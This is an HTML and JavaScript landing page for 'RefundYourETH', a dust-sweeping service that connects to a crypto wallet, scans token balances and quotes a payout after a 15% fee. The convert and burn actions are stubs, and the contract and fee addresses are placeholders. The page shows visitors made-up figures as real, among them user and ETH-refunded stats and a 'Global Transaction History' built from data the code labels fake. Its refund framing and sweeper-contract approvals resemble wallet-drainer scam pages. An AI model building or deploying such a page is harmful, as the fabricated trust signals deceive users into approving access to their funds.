<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>RefundYourETH - Consolidate ERC-20 Dust</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    /* * --- Revamped Stylesheet ---
     * New Color Palette: Modern, clean, and inspired by the Ethereum aesthetic.
     * Improved Layout: More whitespace, better hierarchy, and responsive design.
     * Enhanced UI Components: Softer shadows, cleaner cards, and clearer buttons.
    */
    :root {
      --bg-main: #f4f7fa; /* Light grey background */
      --bg-card: #ffffff; /* White card background */
      --primary-blue: #4A90E2; /* Ethereum-inspired blue */
      --primary-purple: #9013FE; /* Accent purple */
      --text-primary: #1A202C; /* Dark charcoal for text */
      --text-secondary: #718096; /* Medium grey for secondary text */
      --border-color: #E2E8F0; /* Light border color */
      --success-green: #34D399; /* Success state green */
      --shadow-color: rgba(74, 144, 226, 0.1); /* Soft blue shadow */
    }

    * { 
      box-sizing: border-box; 
      margin: 0; 
      padding: 0; 
    }

    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: var(--bg-main);
      color: var(--text-primary);
      text-align: center;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      overflow-x: hidden;
      padding: 0 16px;
      -webkit-font-smoothing: antialiased;
      -moz-osx-font-smoothing: grayscale;
    }

    /* --- Animations --- */
    @keyframes fadeInUp { 
      0% { opacity: 0; transform: translateY(20px); } 
      100% { opacity: 1; transform: translateY(0); } 
    }

    /* --- Header & Logo --- */
    .header {
      padding: 48px 20px 32px;
      animation: fadeInUp 0.8s ease-out;
    }
    .logo {
      width: 80px; /* Adjusted size for the new logo */
      height: 80px;
      margin-bottom: 24px;
      border-radius: 16px;
      box-shadow: 0 8px 24px rgba(0,0,0,0.1);
    }
    h1 {
      font-weight: 700;
      font-size: 2.5rem;
      margin: 0 0 12px;
      letter-spacing: -0.5px;
    }
    .tagline {
      color: var(--text-secondary);
      font-size: 1.1rem;
      max-width: 600px;
      margin: 0 auto 24px;
      line-height: 1.6;
    }

    /* --- Main Interaction Card --- */
    .card {
      width: min(500px, 100%);
      margin: 0 auto 32px;
      background: var(--bg-card);
      border: 1px solid var(--border-color);
      border-radius: 16px;
      padding: 28px;
      box-shadow: 0 10px 30px var(--shadow-color);
      animation: fadeInUp 1s ease-out 0.2s;
      animation-fill-mode: backwards;
    }

    /* --- Buttons & Links --- */
    .button {
      background: linear-gradient(95deg, var(--primary-blue), var(--primary-purple));
      border: none;
      padding: 14px 28px;
      font-size: 1rem;
      color: #fff;
      font-weight: 600;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.2s ease;
      box-shadow: 0 4px 15px rgba(144, 19, 254, 0.2);
      display: inline-block;
      width: 100%;
      margin-bottom: 12px;
    }
    .button:hover { 
      transform: translateY(-2px); 
      box-shadow: 0 6px 20px rgba(144, 19, 254, 0.3);
    }
    .button.secondary {
      background: transparent;
      border: 1px solid var(--border-color);
      box-shadow: none;
      color: var(--primary-blue);
    }
    .button.secondary:hover {
      background-color: #f0f5ff;
      border-color: var(--primary-blue);
    }
    .reset-link { 
      color: var(--text-secondary); 
      font-size: 0.9rem; 
      cursor: pointer; 
      display: block;
      margin-top: 8px;
    }
    .reset-link:hover { text-decoration: underline; }

    /* --- Status & Results --- */
    .status { 
      margin: 16px 0; 
      font-size: 0.95rem; 
      color: var(--text-secondary); 
      min-height: 20px;
    }
    #dust-list { 
      text-align: left; 
      margin: 16px 0;
      max-height: 200px;
      overflow-y: auto;
      padding-right: 8px;
    }
    .token-row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px;
      border-radius: 10px;
      background: #f9fafb;
      margin: 8px 0;
      border: 1px solid var(--border-color);
      font-size: 0.95rem;
    }
    #claimable-amount { 
      margin: 12px 0 8px; 
      font-weight: 600; 
      color: var(--text-primary);
      background-color: #eff6ff;
      padding: 10px;
      border-radius: 8px;
    }

    /* --- Stats Bar --- */
    .stats-bar {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
      gap: 20px;
      background: var(--bg-card);
      border: 1px solid var(--border-color);
      border-radius: 16px;
      padding: 24px;
      margin: 24px auto;
      width: min(700px, 100%);
      animation: fadeInUp 1.2s ease-out 0.4s;
      animation-fill-mode: backwards;
    }
    .stat-value { 
      font-weight: 700; 
      font-size: 1.5rem; 
      color: var(--primary-blue);
    }
    .stat-label { 
      font-size: 0.9rem; 
      color: var(--text-secondary);
      margin-top: 4px;
    }

    /* --- Content Sections (History, FAQ) --- */
    .content-section {
      margin: 48px auto;
      width: min(700px, 100%);
      animation: fadeInUp 1.4s ease-out 0.6s;
      animation-fill-mode: backwards;
      background: var(--bg-card);
      border: 1px solid var(--border-color);
      border-radius: 16px;
      padding: 28px;
      text-align: left;
    }
    .content-section h2 { 
      font-size: 1.5rem; 
      margin-bottom: 24px; 
      text-align: center;
    }

    /* --- Transaction History Table --- */
    .tx-table {
      width: 100%;
      border-collapse: collapse;
      font-size: 0.9rem;
    }
    .tx-table th, .tx-table td {
      padding: 12px;
      border-bottom: 1px solid var(--border-color);
      text-align: left;
    }
    .tx-table th {
      color: var(--text-secondary);
      font-weight: 600;
    }
    .tx-success { 
      color: var(--success-green); 
      font-size: 1.1rem;
      vertical-align: middle;
      margin-right: 8px;
    }
    .donation-note {
      font-size: 0.85rem;
      color: var(--text-secondary);
      margin-top: 24px;
      text-align: center;
      line-height: 1.5;
    }

    /* --- FAQ Section --- */
    .faq-item {
      border-bottom: 1px solid var(--border-color);
      padding: 16px 0;
    }
    .faq-item:last-child { border-bottom: none; }
    .faq-question {
      font-weight: 600;
      cursor: pointer;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .faq-question::after { 
      content: '+'; 
      font-size: 1.5rem; 
      color: var(--primary-blue);
      transition: transform 0.2s ease;
    }
    .faq-answer {
      display: none;
      font-size: 0.95rem;
      color: var(--text-secondary);
      margin-top: 12px;
      line-height: 1.6;
    }
    .faq-item.active .faq-answer { display: block; }
    .faq-item.active .faq-question::after { transform: rotate(45deg); }

    /* --- Footer & Socials --- */
    .social {
      display: flex;
      justify-content: center;
      gap: 24px;
      margin: 40px 0;
    }
    .social img { 
      width: 28px; 
      opacity: 0.6;
      transition: all 0.2s ease; 
    }
    .social a:hover img { 
      opacity: 1;
      transform: scale(1.1); 
    }

    .footer {
      margin-top: auto;
      padding: 32px 0;
      font-size: 0.9rem;
      color: var(--text-secondary);
      border-top: 1px solid var(--border-color);
    }
    .footer a { 
      color: var(--primary-blue); 
      text-decoration: none; 
      font-weight: 500;
    }
    .footer a:hover { text-decoration: underline; }

    /* --- Toast Notification --- */
    .toast {
      position: fixed;
      bottom: 24px;
      left: 50%;
      transform: translateX(-50%);
      background: var(--text-primary);
      color: #fff;
      padding: 12px 20px;
      border-radius: 8px;
      font-size: 0.95rem;
      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
      z-index: 9999;
      display: none;
    }
    .toast.show { 
      display: block; 
      animation: fadeInUp 0.3s ease-out; 
    }

    /* --- Responsive Design --- */
    @media (max-width: 600px) {
      h1 { font-size: 2rem; }
      .tagline { font-size: 1rem; }
      .card, .content-section { padding: 20px; }
      .tx-table { display: block; overflow-x: auto; }
    }
  </style>
</head>
<body>

  <div class="header">
    <img src="https://iili.io/FD9tvja.png" alt="RefundYourETH Logo" class="logo" onerror="this.style.display='none'">
    <h1>Swap All Your Dust for ETH in One Go</h1>
    <p class="tagline">Tired of paying gas for every small swap? Our service finds your wallet's token "dust" and lets you convert it all to ETH in <strong>one single transaction</strong>, saving you time and gas fees.</p>
  </div>

  <div class="card">
    <button id="connect-wallet" class="button">Connect Wallet</button>
    <div id="wallet-info" style="display:none;">
      <div id="wallet-status" class="status">Wallet not connected</div>
      <span id="reset-connection" class="reset-link">Disconnect Wallet</span>
    </div>
    
    <div id="dust-list"></div>
    <div id="claimable-amount"></div>

    <div id="action-buttons" style="margin-top:16px; display:none;">
      <button id="convert-now" class="button">Convert to ETH (1 Gas Fee)</button>
      <button id="burn-now" class="button secondary">Burn Dust</button>
    </div>
  </div>

  <div class="stats-bar">
    <div class="stat">
      <div class="stat-value">150K+</div>
      <div class="stat-label">Happy Users</div>
    </div>
    <div class="stat">
      <div class="stat-value">1.2M+</div>
      <div class="stat-label">Tokens Converted</div>
    </div>
    <div class="stat">
      <div class="stat-value">2,500+</div>
      <div class="stat-label">ETH Refunded</div>
    </div>
  </div>

  <div class="content-section">
    <h2>Global Transaction History</h2>
    <table class="tx-table" id="tx-table">
      <thead>
        <tr>
          <th>Wallet</th>
          <th>Tokens</th>
          <th>Value (ETH)</th>
          <th>Time</th>
        </tr>
      </thead>
      <tbody>
        </tbody>
    </table>
    <p class="donation-note">To keep this tool running, a 15% service fee is automatically deducted from the recovered amount to cover server, development, and gas costs.</p>
  </div>

  <div class="content-section">
    <h2>Frequently Asked Questions</h2>
    <div class="faq-item">
      <div class="faq-question" onclick="this.parentElement.classList.toggle('active')">Why not just swap them myself?</div>
      <div class="faq-answer">Swapping each token individually on a DEX (like Uniswap) would require a separate transaction and a separate gas fee for each swap. Our service bundles all your dust into a single transaction, meaning you only pay the Ethereum network gas fee <strong>once</strong> to convert everything.</div>
    </div>
    <div class="faq-item">
      <div class="faq-question" onclick="this.parentElement.classList.toggle('active')">How does this service work?</div>
      <div class="faq-answer">We scan your wallet for a list of common ERC-20 tokens. If we find any balances, we use a secure smart contract to bundle them up and swap them for ETH on a decentralized exchange, sending the ETH back to you.</div>
    </div>
    <div class="faq-item">
      <div class="faq-question" onclick="this.parentElement.classList.toggle('active')">Is it safe to use?</div>
      <div class="faq-answer">Yes. We use EIP-2612 permits where possible, which means you grant approval by signing a message, not by sending a transaction. This is gasless and safer. For other tokens, a standard approval is needed. Our smart contract is the only party authorized to move the tokens, and its code is verifiable.</div>
    </div>
    <div class="faq-item">
      <div class="faq-question" onclick="this.parentElement.classList.toggle('active')">What are the fees?</div>
      <div class="faq-answer">We deduct a 15% service fee from the final converted ETH amount to maintain and improve this tool. You are also responsible for paying the Ethereum network gas fee for the final conversion transaction.</div>
    </div>
  </div>

  <div class="social">
    <a href="https://t.me/RefundYourETHgroup" target="_blank" aria-label="Telegram">
      <img src="https://cdn.simpleicons.org/telegram/718096" alt="Telegram" onerror="this.style.display='none'">
    </a>
    <a href="https://x.com/RefundYourETH" target="_blank" aria-label="X/Twitter">
      <img src="https://cdn.simpleicons.org/x/718096" alt="X" onerror="this.style.display='none'">
    </a>
    <a href="https://discord.gg/RefundYourETHserver" target="_blank" aria-label="Discord">
      <img src="https://cdn.simpleicons.org/discord/718096" alt="Discord" onerror="this.style.display='none'">
    </a>
  </div>

  <div class="footer">
    <p>Disclaimer: This is a tool for convenience. Always do your own research. You are responsible for all transactions you approve.</p>
    <p>RefundYourETH &copy; 2025 | <a href="/privacy.html" target="_blank">Privacy Policy</a></p>
  </div>

  <div id="toast" class="toast"></div>

  <script src="https://cdn.ethers.io/lib/ethers-5.7.umd.min.js"></script>
  <script src="https://unpkg.com/@web3modal/ethereum@2.7.1/dist/index.js"></script>
  <script src="https://unpkg.com/@walletconnect/ethereum-provider@2.7.1/dist/index.umd.js"></script>

  <script>
    /************ CONFIG – REPLACE THESE VALUES ************/
    const WALLETCONNECT_PROJECT_ID = 'YOUR_WALLET_CONNECT_PROJECT_ID'; // <-- IMPORTANT: GET YOUR OWN ID FROM https://cloud.walletconnect.com/
    const SWEEPER_CONTRACT_ADDRESS = '0xYourSmartContractAddress'; // <-- Your deployed contract address
    const FEE_RECIPIENT = '0xYourFeeWalletAddress';
    const MIN_DUST_USD = 5; // Minimum value to be eligible for conversion

    // Placeholder USD prices — In a real app, fetch these from an API like CoinGecko
    const TOKEN_PRICES_USD = {
      ETH: 3400.00, USDT: 1.00, USDC: 1.00, DAI: 1.00, LINK: 15.00, UNI: 8.00,
      SHIB: 0.00002, DOGE: 0.15, FLOKI: 0.0002, PEPE: 0.00001, '1INCH': 0.40
    };

    // Popular ERC-20s (Ethereum mainnet)
    const TOKENS = [
      { address:'0xdAC17F958D2ee523a2206206994597C13D831ec7', symbol:'USDT', decimals:6,  permit:false },
      { address:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', symbol:'USDC', decimals:6,  permit:true  },
      { address:'0x6B175474E89094C44Da98b954EedeAC495271d0F', symbol:'DAI',  decimals:18, permit:true  },
      { address:'0x514910771AF9Ca656af840dff83E8264EcF986CA', symbol:'LINK', decimals:18, permit:true  },
      { address:'0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984', symbol:'UNI',  decimals:18, permit:true  },
      { address:'0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE', symbol:'SHIB', decimals:18, permit:false },
      { address:'0xba2ae424d960c26247dd6c32edc70b295c744c43', symbol:'DOGE', decimals:8,  permit:false }, // Wrapped DOGE
      { address:'0xcf0C122c6b73ff809C693DB761e7BaeBe62b6a2E', symbol:'FLOKI',decimals:9,  permit:false },
      { address:'0x6982508145454Ce325dDbE47a25d4ec3d2311933', symbol:'PEPE', decimals:18, permit:false },
      { address:'0x111111111117dC0aa78b770fA6A738034120C302', symbol:'1INCH',decimals:18, permit:true  }
    ];

    /************ UI HELPERS ************/
    const $ = sel => document.querySelector(sel);
    const toast = (msg) => {
      const el = $('#toast');
      el.textContent = msg;
      el.classList.add('show');
      setTimeout(() => el.classList.remove('show'), 2800);
    };

    const renderTokenRow = (sym, amount, usd) => {
      const row = document.createElement('div');
      row.className = 'token-row';
      row.innerHTML = `
        <div><strong>${sym}</strong> <span style="opacity:0.7; font-size:0.9rem;">${amount.toLocaleString(undefined, {maximumFractionDigits: 6})}</span></div>
        <div><strong>$${usd.toFixed(2)}</strong></div>
      `;
      return row;
    };

    // Fake transaction data for history (replace with real API)
    const fakeTxData = [
      { wallet: '0xAbC...Def', num: 5, eth: 0.0102, time: '14:16' },
      { wallet: '0xGhi...Jkl', num: 20, eth: 0.0407, time: '14:15' },
      { wallet: '0xMno...Pqr', num: 2, eth: 0.0040, time: '14:12' },
      { wallet: '0xStu...Vwx', num: 1, eth: 0.0020, time: '14:11' },
    ];

    function populateTxHistory() {
      const tbody = $('#tx-table tbody');
      tbody.innerHTML = ''; // Clear previous data
      fakeTxData.forEach(tx => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td><span class="tx-success">✓</span> ${tx.wallet}</td>
          <td>${tx.num}</td>
          <td>${tx.eth.toFixed(4)}</td>
          <td>${tx.time}</td>
        `;
        tbody.appendChild(tr);
      });
    }

    /************ WEB3 SETUP ************/
    const chains = [{
      chainId: 1,
      name: 'Ethereum',
      currency: 'ETH',
      explorerUrl: 'https://etherscan.io',
      rpcUrl: 'https://cloudflare-eth.com'
    }];

    const web3Modal = new Web3Modal.Ethereum.Web3Modal({
      projectId: WALLETCONNECT_PROJECT_ID,
      chains,
      themeMode: 'light',
      themeVariables: {
        '--w3m-font-family': 'Inter, sans-serif',
        '--w3m-accent-color': 'var(--primary-blue)',
        '--w3m-background-color': 'var(--primary-blue)',
      }
    });

    let provider, ethersProvider, signer, userAddress;

    const ERC20_ABI = [
      'function balanceOf(address) view returns (uint256)',
      'function nonces(address) view returns (uint256)',
    ];

    /************ APP LOGIC ************/
    const connectBtn = $('#connect-wallet');
    const resetLink = $('#reset-connection');
    const actionButtons = $('#action-buttons');
    const convertBtn = $('#convert-now');
    const burnBtn = $('#burn-now');
    const statusEl = $('#wallet-status');
    const listEl = $('#dust-list');
    const claimEl = $('#claimable-amount');

    let sessionData = {
      tokensFound: [],
      permitData: [],
      totals: { usd: 0 }
    };

    function updateUIForConnection() {
        connectBtn.style.display = 'none';
        $('#wallet-info').style.display = 'block';
        statusEl.textContent = `Connected: ${userAddress.substring(0, 6)}...${userAddress.substring(userAddress.length - 4)}`;
    }

    async function ensureMainnet() {
      const net = await ethersProvider.getNetwork();
      if (Number(net.chainId) !== 1) {
        toast('Please switch to Ethereum Mainnet.');
        try {
          await provider.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x1' }]
          });
        } catch (e) {
          toast('Failed to switch network.');
          throw e;
        }
      }
    }

    async function connectWallet() {
      try {
        provider = await web3Modal.connect();
        ethersProvider = new ethers.providers.Web3Provider(provider);
        signer = ethersProvider.getSigner();
        await ensureMainnet();
        userAddress = await signer.getAddress();

        updateUIForConnection();
        statusEl.textContent = 'Scanning for dust tokens…';
        await scanTokens();
      } catch (e) {
        console.error("Could not connect wallet.", e);
        toast("Wallet connection cancelled.");
      }
    }

    async function resetConnection() {
      await web3Modal.clearCachedProvider();
      location.reload();
    }

    async function scanTokens() {
      listEl.innerHTML = '';
      claimEl.innerHTML = '';
      actionButtons.style.display = 'none';
      sessionData = { tokensFound: [], permitData: [], totals: { usd: 0 } };

      const net = await ethersProvider.getNetwork();
      const chainId = Number(net.chainId);

      let tokensProcessed = 0;
      for (const t of TOKENS) {
        try {
          const c = new ethers.Contract(t.address, ERC20_ABI, ethersProvider);
          const bal = await c.balanceOf(userAddress);
          if (bal && !bal.isZero()) {
            const amt = Number(ethers.utils.formatUnits(bal, t.decimals));
            const px = TOKEN_PRICES_USD[t.symbol] ?? 0;
            const usd = amt * px;

            if (usd > 0.01) { // Only show tokens with some value
                listEl.appendChild(renderTokenRow(t.symbol, amt, usd));
                sessionData.tokensFound.push({ ...t, balance: bal.toString(), amount: amt, usd });
                sessionData.totals.usd += usd;
            }
          }
        } catch (e) {
          console.error('Token scan error', t.symbol, e);
        }
        tokensProcessed++;
        statusEl.textContent = `Scanning... (${tokensProcessed}/${TOKENS.length})`;
      }

      if (sessionData.tokensFound.length === 0) {
        statusEl.textContent = 'No significant dust balances found.';
        return;
      }

      const totalUsd = sessionData.totals.usd;
      const feePct = 0.15;
      const netUsd = totalUsd * (1 - feePct);
      const estEthReceived = netUsd / (TOKEN_PRICES_USD['ETH'] || 3400);

      claimEl.innerHTML = `Total Value: ~$${totalUsd.toFixed(2)} USD<br>Estimated to Receive: <strong>~${estEthReceived.toFixed(5)} ETH</strong> (after 15% fee)`;
      
      if (totalUsd >= MIN_DUST_USD) {
        statusEl.textContent = 'Found eligible tokens to convert.';
        actionButtons.style.display = 'block';
      } else {
        statusEl.textContent = `Total value is below the $${MIN_DUST_USD} minimum.`;
        actionButtons.style.display = 'none';
        burnBtn.style.display = 'block'; // Still show burn button
      }
      toast('Scan complete.');
    }
    
    // --- Mock functions for onConvert and onBurn ---
    // In a real application, these would interact with your smart contract.
    function missingContractGuard() {
      const missing = !SWEEPER_CONTRACT_ADDRESS || SWEEPER_CONTRACT_ADDRESS === '0xYourSmartContractAddress';
      if (missing) {
        toast('Contract address not configured.');
      }
      return missing;
    }

    async function onConvert() {
        if (missingContractGuard()) return;
        toast("This is a demo. 'Convert' function not implemented.");
        statusEl.textContent = 'Confirming transaction in wallet (demo)...';
        // Here you would build and send the real transaction
    }

    async function onBurn() {
        if (missingContractGuard()) return;
        toast("This is a demo. 'Burn' function not implemented.");
        statusEl.textContent = 'Confirming burn in wallet (demo)...';
    }


    /************ EVENT LISTENERS ************/
    connectBtn.addEventListener('click', connectWallet);
    resetLink.addEventListener('click', resetConnection);
    convertBtn.addEventListener('click', onConvert);
    burnBtn.addEventListener('click', onBurn);

    // Initial setup
    document.addEventListener('DOMContentLoaded', () => {
        populateTxHistory();
    });
  </script>
</body>
</html>
